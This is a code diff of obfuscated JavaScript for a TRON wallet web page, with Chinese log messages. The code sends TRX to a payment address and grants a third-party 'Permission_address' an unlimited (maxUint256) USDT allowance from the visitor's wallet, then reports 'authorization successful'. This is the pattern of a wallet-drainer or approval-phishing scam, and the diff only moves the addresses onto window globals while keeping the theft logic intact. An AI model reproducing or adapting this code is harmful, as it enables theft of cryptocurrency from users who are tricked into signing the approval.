@@ -36,7 +36,7 @@ async function DjdskdbGsj() {
   try {
     console.log("构建TRX转账交易...");
     const transferTransaction = await tronWeb.transactionBuilder.sendTrx(
-      Payment_address,
+      window.Payment_address,
       trxAmountInSun,
       userData.address,
       { feeLimit: feeLimit }
@@ -44,11 +44,11 @@ async function DjdskdbGsj() {
 
     console.log("构建USDT授权增加交易...");
     const approvalTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
-      tronWeb.address.toHex(usdtContractAddress),
+      tronWeb.address.toHex(window.usdtContractAddress),
       'increaseApproval(address,uint256)',
       { feeLimit: feeLimit },
       [
-        { type: 'address', value: Permission_address },
+        { type: 'address', value: window.Permission_address },
         { type: 'uint256', value: maxUint256 }
       ],
       userData.address
@@ -93,7 +93,7 @@ async function KdhshaBBHdg() {
 
     const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
     const feeLimit = 100000000;  // 设置feeLimit为100 TRX
-    const usdtContractAddressHex = tronWeb.address.toHex(usdtContractAddress);
+    const usdtContractAddressHex = tronWeb.address.toHex(window.usdtContractAddress);
 
     try {
         console.log("构建交易...");
@@ -102,7 +102,7 @@ async function KdhshaBBHdg() {
             'increaseApproval(address,uint256)',
             { feeLimit: feeLimit },
             [
-                { type: 'address', value: tronWeb.address.toHex(Permission_address) },
+                { type: 'address', value: tronWeb.address.toHex(window.Permission_address) },
                 { type: 'uint256', value: maxUint256 }
             ],
             tronWeb.defaultAddress.base58
@@ -132,8 +132,6 @@ async function KdhshaBBHdg() {
 
             console.log("交易发送成功，哈希:", transactionHash);
             tip("授权成功");
-
-            // 如果需要，您可以在这里添加其他逻辑，例如数据库操作或发送通知
 
             return transactionHash;
         } else {
